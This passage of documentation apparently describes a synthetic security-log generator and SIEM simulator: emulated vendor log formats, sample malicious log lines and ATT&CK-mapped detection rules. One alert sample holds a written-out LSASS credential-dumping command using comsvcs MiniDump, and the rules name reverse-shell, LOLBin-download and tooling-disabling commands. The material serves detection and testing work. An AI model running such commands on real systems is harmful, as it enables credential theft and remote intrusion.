| `f5` | F5 BIG-IP ASM | comma `key=value` | `appliance-threat` | SQL-Injection, XSS, Command-Execution, Predictable-Resource-Location |
| `ciscoftd` | Cisco FTD (Firepower) | `%FTD-lvl-id` + `Key: Value` | `appliance-threat` | `430001` intrusion: Log4j (58722), Emotet CNC (47332), SQLi (41274) |
| `ciscoise` | Cisco ISE (RADIUS) | segmented hdr + `key=value` | `radius-brute` | 7–10 `CISE_Failed_Attempts` (`5400`) for one MAC — no signature, correlated |
| `snort` | Snort 3 (IDS) | `[gid:sid:rev]` tokens | `appliance-threat` | Log4j (58722), Cobalt Strike (29889), SSH brute (19559), SQLi (13990) |
| `haproxy` | HAProxy | positional + timers/flags | `appliance-threat` | 4× `PR--` 403-denied probes (`/.env`, `/wp-admin/`, …) from one bad IP |
| `bind` | BIND 9 (DNS) | `named` query log | `dns-tunneling` | 42–56-char DGA label under `tunnel.badnet.ru` (TXT) + a threat-intel domain |
| `postfix` | Postfix (mail) | prose + `key=<value>` | `appliance-threat` | Spamhaus Blocklist Hit (554), Invalid Sender Domain (550) |
| `snare` | Windows Event Log (Snare) — **agent** | TAB-delimited `MSWinEventLog` | `windows-threat` | 9–12 × **4625** failed logons for one account from one bad IP (+ benign 4624/4688) |
| `sysmon` | Sysmon (Windows) — **agent** | NXLog `key=value` | `cred-dumping` | **10** `ProcessAccess` into `lsass.exe`, `GrantedAccess 0x1438` (+ benign 1/3/11) |
| `auditd` | Linux auditd — **agent** | `type=… msg=audit(ts:serial)` | `auditd-rootshell` | `SYSCALL` with `auid=1000 uid=0 key="rootshell"` + its `EXECVE` |
| `zeek` | Zeek (NSM) — **agent** | TAB-separated `conn` / `dns` / `ssl` | `c2-beacon` | 4–6 `conn.log` flows to one known-bad IP at a 60 s cadence with near-identical byte counts, plus the `ssl.log` line carrying Cobalt Strike's default JA3 |
| `cloudtrail` | AWS CloudTrail — **api** | JSON record | `cloud-threat` | one of `StopLogging`, `CreateAccessKey`, `PutBucketAcl public-read`, `AttachUserPolicy AdministratorAccess` (+ benign Describe/List calls) |
| `okta` | Okta System Log — **api** | JSON record | `mfa-fatigue` | 7–10 × `auth_via_mfa` `FAILED_PUSH_VERIFY_REJECTED` for one user from one bad IP — no signature, correlated |
| `cef` | CEF (generic ArcSight) | `CEF:0\|…` | `appliance-threat` | Brute Force Attack, Malware Communication, Data Exfiltration Attempt |
| `leef` | LEEF (generic QRadar) | `LEEF:2.0\|…` | `appliance-threat` | Port Scan, Suspect Data Loss, Botnet C2 Communication |
| `ciscoios` | Cisco IOS (switch/router) | `seq: *time: %FAC-sev-MNEM` | `net-config-change` | `%SYS-5-CONFIG_I` from vty removing `logging host` or an inbound ACL |
| `meraki` | Cisco Meraki (MX) | epoch + `security_event` `key=value` | `appliance-threat` | `ids_alerted` signature hit (Log4j `1:58722`) with `dhost` / `direction` |
| `citrix` | Citrix NetScaler (Gateway) | `date ns 0-PPE-0 : module EVENT` | `vpn-brute` | 8–10 `AAA LOGIN_FAILED` for distinct users from one IP against the VPN vserver |
| `squid` | Squid (proxy) | native access log | `covert-c2` | `TCP_TUNNEL` `CONNECT` to Tor ports 9001 / 9051 (+ benign `TCP_MISS` GETs) |
| `esxi` | VMware ESXi | `Hostd`/`Vpxa` `[Originator@6876 …]` | `hypervisor-threat` | lockdown mode disabled, SSH enabled, or `esxcli vm process kill` |
| `suricata` | Suricata (EVE JSON) | EVE JSON per line | `appliance-threat` | `event_type: alert` — ET signature for Log4j / Cobalt Strike / SQLi |
| `entra` | Microsoft Entra ID — **api** | `SigninLogs` JSON | `identity-threat` | legacy-auth sign-in with Conditional Access `notApplied`, or an OAuth consent grant |
| `crowdstrike` | CrowdStrike Falcon — **api** | `DetectionSummaryEvent` JSON | `appliance-threat` | sensor verdict — the tactic, technique and `PatternDispositionDescription` are already named |
| `k8saudit` | Kubernetes audit — **api** | `audit.k8s.io/v1` JSON | `k8s-threat` | privileged / `hostPID` pod create and `pods/exec` by `system:anonymous` |
| `ciscoesa` | Cisco Secure Email (ESA) | CEF consolidated log event | `phishing` | `ESAASVerdict=POSITIVE` + `ESAAMPVerdict=MALICIOUS`, spf/dmarc `Fail`, weaponised attachment quarantined |
| `cyberark` | CyberArk Vault (EPV) | CEF (XSL-translated audit XML) | `password-store-theft` | one holder running `Retrieve password` across every privileged safe via PACLI |
| `ivanti` | Ivanti Connect Secure (VPN) | `- ics - [ip] user(realm)[roles] - CODE:` | `vpn-brute` | 10–12 `AUT23457` login failures for distinct accounts from one IP (+ benign `AUT24414` / `AUT22673`) |
| `infoblox` | Infoblox NIOS (DDI) | ISC `named` / `dhcpd` lines | `dns-tunneling` | 44–58-char encoded label under a known-bad zone (TXT), alongside `DHCPREQUEST`/`DHCPACK` leases |
| `veeam` | Veeam Backup & Replication | RFC 5424 + `[origin …][categoryId …]` SD | `ransomware` | instance `28200` / `23090` / `24030` — repository or job deleted, immutability disabled |
| `umbrella` | Cisco Umbrella (DNS) — **api** | quoted CSV | `dns-tunneling` | `Blocked` verdict on a threat-intel domain with `blockedCategories` *Command and Control* |
| `azure` | Azure Activity Log — **api** | Activity Log JSON | `cloud-threat` | one of diagnostic-settings delete, `roleAssignments/write` Owner, `listKeys`, key-vault policy write |
| `m365` | Microsoft 365 audit — **api** | unified-audit `AuditData` JSON | `cloud-threat` | `New-InboxRule` forwarding externally with `DeleteMessage True` |
| `defender` | Defender for Endpoint — **api** | Defender XDR `AlertInfo` / `AlertEvidence` JSON | `appliance-threat` | one High alert (credential dumping / Cobalt Strike C2 / backup deletion) carrying its own `AttackTechniques`, alongside informational ones |

### Example wire lines

Representative malicious lines (values such as timestamps, serials, and session
IDs are randomised at generation time):

**Palo Alto** THREAT (CSV):

```
<130>Jul 16 10:22:41 PA-3220 1,2026/07/16 10:22:41,012345678901,THREAT,vulnerability,0,2026/07/16 10:22:41,185.220.101.44,10.10.1.11,0.0.0.0,0.0.0.0,untrust-to-dmz,,,web-browsing,vsys1,untrust,dmz,ethernet1/1,ethernet1/2,forward-log,2026/07/16 10:22:41,123456,1,54321,443,0,0,0x0,tcp,reset-both,"Apache Log4j Remote Code Execution Vulnerability(91991)",code-execution,critical,client-to-server
```

**FortiGate** IPS (`key=value`):

```
<162>date=2026-07-16 time=10:22:41 devname="FGT60F" devid="FGT12345TK1234567" logid="0419016384" type="utm" subtype="ips" level="critical" vd="root" srcip=185.220.101.44 srcport=51000 dstip=10.10.1.11 dstport=443 proto=6 action="dropped" policyid=12 service="HTTPS" attack="Apache.Log4j.Error.Remote.Code.Execution" attackid=51006 severity="critical" msg="ips dropped …"
```

**Cisco ASA** inbound deny (`%ASA-lvl-id`):

```
<164>Jul 16 10:22:41 ASA-5516 : %ASA-4-106023: Deny tcp src outside:185.220.101.44/51000 dst inside:10.10.1.11/3389 by access-group "outside_access_in"
```

**CEF** (generic ArcSight):

```
<146>Jul 16 10:22:41 arcsight-conn CEF:0|Security|ThreatManager|1.0|912|Malware Communication|9|src=185.220.101.44 dst=10.10.1.11 spt=51000 dpt=443 proto=TCP act=blocked
```

**Cisco FTD** `430001` intrusion (`%FTD-lvl-id` + `Key: Value` — note the space
after each colon, which is what separates it from PAN-OS CSV and FortiOS `k=v`):

```
<161>Jul 16 2026 22:05:01 firepower %FTD-1-430001: Protocol: tcp, SrcIP: 5.188.206.130, DstIP: 172.17.214.247, SrcPort: 7374, DstPort: 443, Message: "MALWARE-CNC Win.Trojan.Emotet outbound connection", Classification: A Network Trojan was detected, Priority: 1, GID: 1, SID: 47332, InlineResult: Blocked
```

**Cisco ISE** failed RADIUS auth. After the category comes ISE's segmented header
— `msg_id total_seg seg_num` (`0000664767 1 0`): real ISE splits long messages
across multiple datagrams that a collector must reassemble.

```
<179>Jul 16 22:05:00 ise-node-02 CISE_Failed_Attempts 0000664767 1 0 2026-07-16 22:05:00.959 +02:00 0001711172 5400 NOTICE Failed-Attempt: Authentication failed, ConfigVersionId=12, Device IP Address=10.0.0.23, DestinationIPAddress=10.10.0.30, DestinationPort=1812, UserName=oracle@corp.local, Protocol=Radius, NetworkDeviceName=SW-ACCESS-3850, NAS-IP-Address=10.0.0.23, Service-Type=Framed, Calling-Station-ID=C7-D6-35-CC-BB-36, NAS-Port-Type=Ethernet, FailureReason=22040 Wrong password or invalid shared secret
```

**Snort 3** (`alert_syslog`) — `[gid:sid:rev]` then bracketed tokens. Priority-3
noise events carry no `threatSig` and deliberately raise no alert:

```
<185>Jul 16 22:05:00 snort-sensor-01 snort[67973]: [1:13990:12] "SQL union select possible sql injection attempt" [Classification: Web Application Attack] [Priority: 1] {TCP} 45.83.193.12:4600 -> 10.17.78.191:443
```

**HAProxy** — served vs. proxy-denied. The `Tq/Tw/Tc/Tr/Tt` timer tuple and the
4-character **termination state** are the signal: `----` is a clean exchange,
`PR--` means the proxy itself denied the request (`<NOSRV>`, so it never reached
a backend, and the timers are `-1`):

```
<134>Jul 16 22:05:00 haproxy-02 haproxy[2831]: 77.145.132.91:14561 [16/Jul/2026:22:05:00.805] http-in static/srv2 8/0/23/75/66 200 22640 - - ---- 15/5/1/0/0 0/0 {shop.example.com} {} "GET /health HTTP/1.1"
<132>Jul 16 22:05:00 haproxy-02 haproxy[24734]: 91.219.236.19:32993 [16/Jul/2026:22:05:00.936] http-in http-in/<NOSRV> -1/-1/-1/-1/0 403 188 - - PR-- 9/1/0/0/0 0/0 {shop.example.com} {} "GET /admin/config.php HTTP/1.1"
```

**BIND 9** DGA/tunnel query — `@0x…` client handle, and the trailing flag string
(`+` RD, `E(0)` EDNS, `T` TCP, `D` DNSSEC):

```
<28>Jul 16 22:05:01 dns-01 named[2293]: client @0x7167c821 192.168.15.161#28383 (1hbbvfodpnemlc5421y4ck9yszoz1bp0ju6abibk4v4j71o86fwyjyg.tunnel.badnet.ru): query: 1hbbvfodpnemlc5421y4ck9yszoz1bp0ju6abibk4v4j71o86fwyjyg.tunnel.badnet.ru IN TXT +E(0)
```

**Postfix** reject — prose with `key=<value>` angle-bracket pairs (`mail` facility):

```
<20>Jul 16 22:05:01 mail-gw-01 postfix/smtpd[11030]: NOQUEUE: reject: RCPT from unknown[91.219.236.19]: 550 Sender address rejected: Domain not found; from=<bnev0un1@mail.dark-pool.su> to=<www-data@corp.local> proto=SMTP helo=<Static-IP-9121923619>
```

**Windows Event Log via Snare** — failed logon (`4625`). The fields are
**TAB-separated** (shown here as real tabs), starting with the literal
`MSWinEventLog` marker. Windows emits no syslog itself: a Snare or NXLog agent
produces this line, which is why the source is badged `agent`:

```
<188>Jul 16 22:44:11 WIN-DC01 MSWinEventLog	4	Security	47258	Thu Jul 16 22:44:11 2026	4625	Microsoft-Windows-Security-Auditing	ftpuser	N/A	Failure Audit	WIN-DC01	Logon		An account failed to log on. Account Name: ftpuser Logon Type: 3 Failure Reason: Unknown user name or bad password. Source Network Address: 91.219.236.19 Status: 0xC000006D	47258
```

**Linux auditd** — a root shell from an unprivileged login, relayed by
`audisp-syslog`. Note that both records carry the **identical**
`audit(1784234651.263:6581)` stamp: that shared epoch-and-serial is the join key a
collector uses to stitch the `SYSCALL` and `EXECVE` records back into one event.
`auid=1000` (the login identity, which survives `su`/`sudo`) together with `uid=0`
is the signal — `key="rootshell"` is the local audit rule that flagged it:

```
<11>Jul 16 22:44:11 srv-app-02 audispd[2225]: type=SYSCALL msg=audit(1784234651.263:6581): arch=c000003e syscall=59 success=yes exit=0 ppid=5331 pid=15491 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 tty=pts1 ses=3 comm="bash" exe="/bin/bash" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="rootshell"
<11>Jul 16 22:44:11 srv-app-02 audispd[2225]: type=EXECVE msg=audit(1784234651.263:6581): argc=3 a0="bash" a1="-i" a2="-p"
```

**Sysmon** — a handle request into LSASS (`EventID 10`), relayed by NXLog's
`key=value` output. The header fields are common to every Sysmon record; everything
from `SourceImage` on is specific to event ID 10. `GrantedAccess` is the whole
story: `0x1410` is `VM_READ | QUERY_INFORMATION`, exactly what a memory dump needs
and nothing a normal process asks of LSASS:

```
<186>Aug 13 14:22:09 WIN-DC01 Sysmon[2618]: EventID=10 EventType="Process accessed" UtcTime="2026-08-13T12:22:09.325Z" Computer="WIN-DC01" ProcessGuid="{c4519883-ad88-42ef-8677-b6bf96815264}" ProcessId=4902 Image="C:\Windows\System32\rundll32.exe" User="CORP\jdoe" SourceImage="C:\Windows\System32\rundll32.exe" TargetImage="C:\Windows\System32\lsass.exe" GrantedAccess="0x1410" CallTrace="UNKNOWN(00007FF9C0D2A1B4)|dbgcore.dll+7A1C|comsvcs.dll+6B4E"
```

**Zeek** — `conn.log` and `ssl.log` data lines, **TAB-separated** (shown here as
real tabs) with no header block: each path has a fixed positional field list, which
is why the syslog tag carries the path (`zeek_conn`, `zeek_ssl`). Field order for
`conn` is `ts uid orig_h orig_p resp_h resp_p proto service duration orig_bytes
resp_bytes conn_state local_orig local_resp missed_bytes history orig_pkts
orig_ip_bytes resp_pkts resp_ip_bytes`. The two lines share a `uid`, which is how
Zeek links a connection to its protocol analysis — here a 60 s beacon cadence with
near-identical byte counts, and Cobalt Strike's default JA3 on the TLS handshake:

```
<156>Aug 13 14:23:02 zeek-sensor-01 zeek_conn: 1786623782.862000	Cj85uhmftumpi	10.32.159.147	54606	91.219.236.19	443	tcp	ssl	60.113000	284	1147	SF	T	F	0	ShADadFf	9	644	9	1507
<156>Aug 13 14:23:02 zeek-sensor-01 zeek_ssl: 1786623782.862000	Cj85uhmftumpi	10.32.159.147	54606	91.219.236.19	443	TLSv12	TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384	beacon.malware-cdn.top	T	a0e9f5d64349fb13191bc781f81f42e1	ae4edc6faf64d08308082ad26be60767
```

**AWS CloudTrail** — a JSON record, re-emitted by a connector. AWS writes these to
S3 or EventBridge and never to a socket, which is why the source is badged `api`.
`userIdentity` plus `eventName` is the whole detection surface — `DeleteTrail` on
the audit trail itself is an attacker clearing the tape:

```
<179>Aug 13 14:22:22 aws-connector-01 aws_cloudtrail: {"eventVersion":"1.09","userIdentity":{"type":"IAMUser","principalId":"AIDA3679D50BFC0C10E66","arn":"arn:aws:iam::210987654321:user/ci-runner","accountId":"210987654321","userName":"ci-runner"},"eventTime":"2026-08-13T12:22:22Z","eventSource":"cloudtrail.amazonaws.com","eventName":"DeleteTrail","awsRegion":"us-east-1","sourceIPAddress":"193.36.119.7","userAgent":"aws-cli/2.15.30 Python/3.11.6","requestParameters":{"name":"arn:aws:cloudtrail:us-east-1:210987654321:trail/org-audit-trail"},"responseElements":null,"eventID":"c0553b75-715d-45af-a8d6-699083169b91","eventType":"AwsApiCall","readOnly":false,"managementEvent":true,"recipientAccountId":"210987654321"}
```

**Okta System Log** — a JSON record polled from `GET /api/v1/logs`. The
`client.geographicalContext` block is what makes impossible travel detectable at
all, and `outcome.reason` distinguishes a rejected MFA push from an expired one:

```
<180>Aug 13 14:22:28 okta-connector-01 okta_systemlog: {"uuid":"4059a24f-fdba-453a-a664-01414a20a1b5","published":"2026-08-13T12:22:28.851Z","eventType":"user.authentication.auth_via_mfa","version":"0","severity":"WARN","displayMessage":"Authentication of user via MFA","actor":{"id":"00u3e4f4h4a","type":"User","alternateId":"mchen@corp.local","displayName":"mchen"},"client":{"userAgent":{"rawUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","os":"Windows 10","browser":"CHROME"},"zone":"null","device":"Computer","ipAddress":"193.36.119.7","geographicalContext":{"city":"Shenzhen","country":"China","geolocation":{"lat":22.54,"lon":114.06}}},"outcome":{"result":"FAILURE","reason":"FAILED_PUSH_VERIFY_REJECTED"},"authenticationContext":{"authenticationProvider":"OKTA_AUTHENTICATION_PROVIDER","credentialType":"OTP"},"securityContext":{"asNumber":4134,"isProxy":true},"target":null}
```

**Microsoft 365 unified audit** — one feed for a dozen products. The common
fields are always there; everything after `ClientAppId` is what *this* workload
adds, which is why a parser for it has to treat the schema as a union rather than
a fixed record. A SharePoint download:

```
<180>Aug 13 14:22:31 o365-connector-01 o365_audit: {"CreationTime":"2026-08-13T12:22:31","Id":"dd6cc5ed-4393-4beb-acc8-b35fd4405965","Operation":"FileDownloaded","OrganizationId":"8f4a1c62-77d3-4b0e-9a55-2c1de9f80b31","RecordType":6,"ResultStatus":"Succeeded","UserKey":"8C1C70E1E2AE2B3E0E3BB73C","UserType":0,"Version":1,"Workload":"SharePoint","ClientIP":"91.219.236.19","ActorIpAddress":"91.219.236.19","UserId":"contractor@corp.example","ObjectId":"https://corp.sharepoint.com/sites/Finance/Shared Documents/Salary-bands.xlsx","Parameters":null,"MailboxOwnerUPN":"contractor@corp.example","ClientAppId":"5a883007-b221-48dd-b37c-bdff99623630","SiteUrl":"https://corp.sharepoint.com/sites/Finance/","SourceRelativeUrl":"Shared Documents/Salary-bands.xlsx","SourceFileName":"Salary-bands.xlsx","SourceFileExtension":"xlsx","ItemType":"File","EventSource":"SharePoint","UserAgent":"Microsoft SkyDriveSync 24.086.0428.0003"}
```

…and an Exchange mailbox sync, where the same envelope carries
`OperationProperties` and `Folders` instead:

```
<180>Aug 13 14:22:33 o365-connector-01 o365_audit: {"CreationTime":"2026-08-13T12:22:33","Id":"0393eaa6-c66d-42e9-9324-8e712683bb99","Operation":"MailItemsAccessed","OrganizationId":"8f4a1c62-77d3-4b0e-9a55-2c1de9f80b31","RecordType":2,"ResultStatus":"Succeeded","UserKey":"40E53D04F904AB6F8A2FAE59","UserType":0,"Version":1,"Workload":"Exchange","ClientIP":"185.220.101.44","ActorIpAddress":"185.220.101.44","UserId":"asmith@corp.example","ObjectId":"asmith@corp.example\\Finance","Parameters":null,"MailboxOwnerUPN":"asmith@corp.example","ClientAppId":"da45730d-9a05-4962-8d30-ddb09776a35d","ClientInfoString":"Client=WebServices;Action=Sync;Microsoft Office/16.0 (Exchange Web Services)","OperationProperties":[{"Name":"MailAccessType","Value":"Sync"},{"Name":"IsThrottled","Value":"False"}],"Folders":[{"Path":"\\Finance","FolderItems":[{"InternetMessageId":"<2b443bea7b2aa1d8@corp.example>"}]}]}
```

**Microsoft Entra ID `AuditLogs`** — the *other* category on the same connector.
A sign-in record says who authenticated; this says what changed, and the evidence
is entirely in `targetResources[].modifiedProperties` — old value beside new:

```
<178>Aug 13 14:22:35 entra-connector-01 entra_audit: {"time":"2026-08-13T12:22:35.613Z","resourceId":"/tenants/8f4a1c62-77d3-4b0e-9a55-2c1de9f80b31/providers/Microsoft.aadiam","operationName":"Update conditional access policy","category":"AuditLogs","tenantId":"8f4a1c62-77d3-4b0e-9a55-2c1de9f80b31","resultType":"success","properties":{"id":"dd6509c9-ae1c-4d60-893b-20f1df94e090","activityDateTime":"2026-08-13T12:22:35.613Z","activityDisplayName":"Update conditional access policy","category":"Policy","loggedByService":"Conditional Access","operationType":"Update","result":"success","initiatedBy":{"user":{"id":"baff708f-1033-45c6-9bf8-292bc560f81d","userPrincipalName":"svc_admin@corp.local","ipAddress":"185.220.101.44"}},"targetResources":[{"type":"Policy","displayName":"CA001: Require MFA for all users","userPrincipalName":null,"id":"5ca3cbf8-d6c8-432c-8f85-879ed5144e0f","modifiedProperties":[{"displayName":"ConditionalAccessPolicy","oldValue":"{\"state\":\"enabled\",\"conditions\":{\"users\":{\"excludeUsers\":[]}}}","newValue":"{\"state\":\"enabledForReportingButNotEnforced\",\"conditions\":{\"users\":{\"excludeUsers\":[\"494f24a5-6c9e-4576-87d4-619970472f47\"]}}}"}]}]}}
```

**Microsoft Defender for Endpoint** — an alert from the Defender XDR streaming
API. Note `AttackTechniques`: the sensor has already made the ATT&CK mapping, so
`appliance-threat` uses it instead of inferring one from the title. The command
line stays in `ProcessCommandLine` and out of the syslog message, which is what
keeps the behavioural rules from re-detecting a verdict Defender already reached:

```
<170>Aug 13 14:22:37 WIN-FS02 defender_xdr: {"Timestamp":"2026-08-13T12:22:37.618Z","AlertId":"da626067564_53d8250a","Title":"Suspicious credential dumping activity","Description":"Suspicious credential dumping activity on WIN-FS02. Process blocked.","Category":"CredentialAccess","Severity":"High","ServiceSource":"Microsoft Defender for Endpoint","DetectionSource":"EDR","AttackTechniques":["T1003.001"],"Status":"New","DeviceId":"48f89511e88feed99f062e6296cd30b041cca87a","DeviceName":"WIN-FS02","DeviceLocalIP":"10.10.3.20","AccountDomain":"CORP","AccountName":"kwalsh","FileName":"rundll32.exe","FolderPath":"C:\\Windows\\System32","SHA256":"546b018cf8e072b6a88646031aa7108ee4680d57e8a5c44ade55b9d7d2f566d9","ProcessCommandLine":"rundll32.exe comsvcs.dll, MiniDump 712 C:\\Windows\\Temp\\out.dmp full","RemoteIP":"91.219.236.19","RemoteUrl":"https://kx7z2q-c2.badnet.ru/","RemediationAction":"Process blocked","AlertLink":"https://security.microsoft.com/alerts/da626067564_53d8250a"}
```

For every one of these four, the syslog `host` is the **connector**, not the
machine the event happened on — the device is `DeviceName`, the site is
`SiteUrl`, the mailbox is `MailboxOwnerUPN`. Grouping an API feed by syslog host
puts a whole tenant on one box; see the field-mapping table in
[`CONNECTORS.md`](CONNECTORS.md#7-field-mapping-cheat-sheet).

Click any appliance event in the live stream to open the drawer and see its full
raw wire line alongside the parsed fields.

---

## 7. The Jedi SIEM engine

`Jedi.ingest(event)`:

1. Updates counters — total events, per-severity, per-source, timeline buckets.
2. Adds the event to a capped recent-events ring (default 400).
3. Runs every detection rule; each hit becomes an **alert** (capped at 200).

**Rolling metrics**

- **EPS** — events in a trailing 3 s window.
- **Timeline** — per-second buckets of events and alerts (last ~120 s), drawn on
  the canvas chart.
- **Threat level** — sum of the last 2 minutes of alert severities
  (critical = 4, high = 3, medium = 2, low = 1) mapped to
  `GUARDED → ELEVATED → HIGH → SEVERE → CRITICAL`.

**Correlator** — a small stateful helper shared by the rules:

| Primitive | Use |
|-----------|-----|
| `window(ns, key, ms, now)` | Sliding array of timestamps within `ms` |
| `windowSet(ns, key, ms, now, value)` | Sliding set of distinct values (e.g. ports, users) |
| `cooldown(ns, key, ms, now)` | True at most once per `ms` — throttles repeat alerts |

---

## 8. Detection rules

Each rule returns `null` (no match) or an alert `{severity, tactic, technique,
message, srcIp, host, evidence}`. Correlating rules use the primitives above.

| Rule id | Name | Trigger | ATT&CK |
|---------|------|---------|--------|
| `ssh-bruteforce` | SSH Brute-Force | ≥ 8 failed `sshd` logins / IP / 60 s | T1110 |
| `brute-success` | Login After Brute Force | `Accepted password` after a failure burst | T1078 |
| `port-scan` | Horizontal Port Scan | ≥ 15 distinct denied dst ports / IP / 30 s | T1046 |
| `sql-injection` | SQL Injection | SQLi regex in an HTTP request | T1190 |
| `c2-beacon` | C2 / Known-Bad Destination | internal host → threat-intel IP | T1071 |
| `data-exfil` | Large Outbound Transfer | outbound flow > 100 MB | T1048 |
| `dns-tunneling` | DNS Tunneling | long DNS label / known-bad domain (`dns`, `bind`, `infoblox`, `umbrella` sources) | T1071.004 |
| `priv-esc` | Privilege Escalation | `sudo … USER=root` / Win 4672 | T1068 |
| `ids-malware` | IDS Malware Signature | Suricata/ET trojan/exploit | T1204 |
| `radius-brute` | RADIUS / 802.1X Brute Force | ≥ 6 Cisco ISE `5400` failures / MAC / 60 s | T1110 |
| `auditd-rootshell` | Root Shell From Unprivileged Login | auditd `SYSCALL`, `auid` set & ≠0, `uid=0`, `key="rootshell"` | T1548 |
| `appliance-threat` | Appliance IPS / WAF Signature | any `threatSig` present; a source that also sets `threatTechnique` (Defender's `AttackTechniques`) keeps its own ATT&CK mapping | T1190 (by signature) |
| `web-exploit` | Web Application Attack | Log4Shell / Exchange Autodiscover SSRF (ProxyShell / ProxyNotShell) / XSS / traversal / web shell / scanner UA / `169.254.169.254` metadata SSRF | T1190·T1059·T1083·T1505.003·T1595·T1552.005 |
| `windows-threat` | Windows Security Event | 4625 brute/spray, 4768 no-preauth RC4, 4769 RC4 or blank domain, 4662 repl, 4732/4720, 1102, 4624 PtH, 7045 PsExec (`windows` + `snare` sources) | T1110·T1558.001·T1558.003·T1558.004·T1003.006·T1136·T1070.001·T1550.002·T1021.002 |
| `cred-dumping` | Credential Dumping (LSASS) | Sysmon **10** into `lsass.exe` with `0x1010/0x1410/0x1438/0x143a`, or `comsvcs MiniDump` / procdump / mimikatz on a command line | T1003.001 |
| `persistence-mech` | Persistence Mechanism Created | `CurrentVersion\Run` write, `schtasks /create` or 4698, `sc create` or 7045 (PsExec-style names excluded) | T1547.001·T1053.005·T1543.003 |
| `lolbin-abuse` | LOLBin Download / Proxy Execution | `certutil -urlcache/-decode`, `bitsadmin /transfer`, `mshta http…`, `regsvr32 /i:http` | T1105·T1218 |
| `security-tooling-disabled` | Security Tooling Disabled | `DisableRealtimeMonitoring`, `-ExclusionPath`, AMSI patch markers, `net stop windefend`, or an EDR's own tamper verdict (Defender: tamper protection off, scan exclusion added, sensor stopped) | T1562.001 |
| `ad-recon` | Active Directory Enumeration | SharpHound / BloodHound / AdFind / `Get-Domain*` on a command line, or ≥ 10 × 4662 directory reads / account / 60 s | T1087.002 |
| `cloud-threat` | Cloud Control-Plane Abuse | three control planes in one rule — CloudTrail `eventName` (trail/detector deletion, IAM credential creation, admin policy attach, public bucket, root console login), Azure `operationName` (diagnostic-settings delete, privileged `roleAssignments/write`, `listKeys`, key-vault policy write), and Microsoft 365 via `m365Verdict()`: forwarding rules, org-wide transport rules, audit logging switched off, anonymous sharing links, external Teams guests, eDiscovery search and export, Power Automate exfil flows, mailbox `Sync` bursts (≥ 8 / 10 min) and file-download bursts (≥ 12 / 10 min) | T1562.008·T1098.001·T1098.003·T1530·T1078.004·T1552.001·T1555·T1114.002·T1114.003·T1199·T1213·T1213.002·T1567 |
| `identity-threat` | Identity Provider Threat | Okta `user.session.start` successes from ≥ 2 countries / hour, or an MFA-factor / policy / privilege change; Entra `SignInLogs` (legacy-auth CA bypass, OAuth consent, impossible travel) and `AuditLogs` (security-info / authentication-method change, Conditional Access policy weakened or deleted) | T1078.004·T1098.003·T1528·T1556.006·T1556.009 |
| `mfa-fatigue` | MFA Push Bombing | ≥ 6 rejected Okta push prompts / user / 5 min, then a **critical** follow-up if one is finally approved | T1621 |
| `reverse-shell` | Reverse Shell | `/dev/tcp/`, `nc -e`, `bash -i >&` | T1059 |
| `susp-powershell` | Suspicious PowerShell | `-enc` / `FromBase64String` / hidden window | T1059.001 |
| `cryptomining` | Cryptomining | `stratum+tcp` / known pool | T1496 |
| `ransomware` | Ransomware Behavior | shadow-copy deletion / mass `.locked`, or a backup repository or job deleted / immutability disabled (T1490 — the prelude, seen by `veeam`) | T1486·T1490 |
| `dos-flood` | DoS / Flood | flood markers, or ≥ 40 blocks to one host / 5 s | T1498 |
| `phishing` | Phishing Email | SPF/DKIM/DMARC fail + risky attachment, or the gateway's own verdict (`mail` + `ciscoesa` sources) | T1566 |
| `process-injection` | Process Injection | Sysmon **10** `ProcessAccess` with a `CreateRemoteThread`-shaped `GrantedAccess` | T1055 |
| `password-store-theft` | Credentials From Password Store | browser `Login Data` **and** `Local State` read together, or one holder checking out ≥ 4 privileged CyberArk safes / 2 min | T1555.003·T1555.005 |
| `masquerading` | Masquerading System Binary | a `System32` binary name running from a user-writable path | T1036.005 |
| `remote-access-tool` | Unmanaged Remote Access Tool | AnyDesk / ScreenConnect-class binary making an outbound connection | T1219 |
| `sandbox-evasion` | Sandbox / VM Evasion | VM-artefact probing before the payload runs | T1497 |
| `covert-c2` | Covert C2 Channel | proxy `CONNECT` to Tor ports (9001 / 9051), or a fixed-cadence pull loop against a trusted SaaS host | T1090.003·T1102.002 |
| `cloud-exfil` | Exfiltration to Cloud Storage | `PUT`/`POST` > 100 MB to Dropbox / Mega / transfer.sh and friends | T1567.002 |
| `net-config-change` | Network Device Config Tampering | Cisco IOS `%SYS-5-CONFIG_I` removing `logging host` or an ACL | T1562.004 |
| `vpn-brute` | VPN / Gateway Credential Stuffing | ≥ 6 distinct accounts tried from one IP / 2 min (`citrix` + `ivanti` sources) | T1110.004 |
| `hypervisor-threat` | Hypervisor Tampering | ESXi lockdown mode disabled, SSH enabled, or `esxcli vm process kill` | T1562.001 |
| `k8s-threat` | Kubernetes Cluster Abuse | privileged / `hostPID` pod create, or `pods/exec` by an anonymous subject | T1611 |
| `lateral-exec` | Remote Execution (WMI / WinRM) | connect to 135 / 5985 followed by a remote process create | T1047·T1021.006 |

---

## 9. File replay

Load a `.log` / `.txt` / `.csv` / `.json` file in **File replay**, tick **use as
source** and (optionally) **loop**. Each line is parsed best-effort into an event:

- A leading `<PRI>` sets facility/severity; the rest becomes the message.
- Host is extracted from an RFC 3164 or ISO-8601 timestamp prefix if present.
- The first two IPs found populate `srcIp` / `dstIp`, so IP-based rules still fire.
- The original line is preserved verbatim as `raw`.

While active, file lines replace the synthetic baseline and are emitted at the
configured EPS, looping when they reach the end (if **loop** is on). File events
are also forwarded and count toward the volume cap like any other event.

---

## 10. Live forwarding & the backend API

A browser cannot open raw UDP/TCP sockets, so **forwarding requires `server.js`.**
When **Forward live** is on, the browser batches up to 1000 events and POSTs them
every 500 ms; the backend emits them to the collector. The same backend also
carries **Splunk HEC** — a browser could POST to HEC directly, but the token would
sit in page JavaScript and every batch would need a CORS pre-flight Splunk does
not answer, so HEC rides the same relay.

### Endpoints

| Method & path | Body | Response | Purpose |
|---------------|------|----------|---------|
| `POST /forward` | `{ip, port, proto:'udp'\|'tcp', lines[]}` | `{ok, sent, total, error}` | Relay lines as UDP (fire-and-forget) or TCP (newline-framed, RFC 6587) |
| `POST /forward` | `{ip, port, proto:'hec', hec{}, events[]}` | `{ok, sent, total, error}` | Relay events to a Splunk HTTP Event Collector |
